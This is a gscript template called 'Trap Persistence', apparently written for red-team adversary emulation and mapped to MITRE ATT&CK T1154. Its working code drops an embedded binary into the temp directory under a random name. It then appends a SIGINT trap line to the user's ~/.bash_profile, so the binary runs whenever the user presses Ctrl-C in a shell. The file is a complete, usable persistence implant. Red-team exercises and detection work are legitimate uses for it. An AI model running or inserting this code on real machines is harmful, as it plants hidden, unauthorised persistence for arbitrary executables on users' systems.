// Example gscript template
// Title: Trap Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using Trap
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1154

//priority:90
//timeout:150

//go_import:os/user as user

//import:/private/tmp/example.macho
  
function Deploy() {
    console.log("Starting Trap Persistence");

    // Getting our asset
    var exampleBin = GetAssetAsBytes("example.macho");
    if (exampleBin[1] != null) {
        console.log("errors: "+exampleBin[1].Error());
    }   
    // Getting a file name
    var temppath = os.TempDir();
    //var temppath = "/usr/local";
    var naming = G.rand.GetAlphaString(4);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    var dropErr = G.file.WriteFileFromBytes(name, exampleBin[0]);
    if (dropErr != null) {
        console.log("errors: "+dropErr.Error());
    } else {
        console.log("dropped the example binary here: "+name); 
    }

    // Persist our binary w/ a trap on SIGINT (signal 2), using .bash_profile to get it into the builtin shell
    var trap_string = "trap " + name + " 2 \n";

    // Get User Dir
    var whoami = user.Current();
    var file_location = whoami[0].HomeDir+"/.bash_profile";
    console.log("File Location: "+ file_location);
    var exists = G.file.CheckExists(file_location);
    if ( exists == true ) {   
        var obj = G.file.AppendFileString(file_location, trap_string);
        if (obj != null) {
            console.log("errors: "+obj.Error());
        } else {
            console.log("file already exists so appended: " + file_location);
            console.log("Persisted binary using SIGINT trap: "+ name);
        }
    } else {
        var obj = G.file.WriteFileFromString(file_location, trap_string);
        if (obj != null) {
            console.log("errors: "+obj.Error());
        } else {
            console.log("file newly created: " + file_location);
            console.log("Persisted binary using SIGINT trap: "+ name);
        }
    }
    console.log("Done Trap persistence");
    return true;
  }
  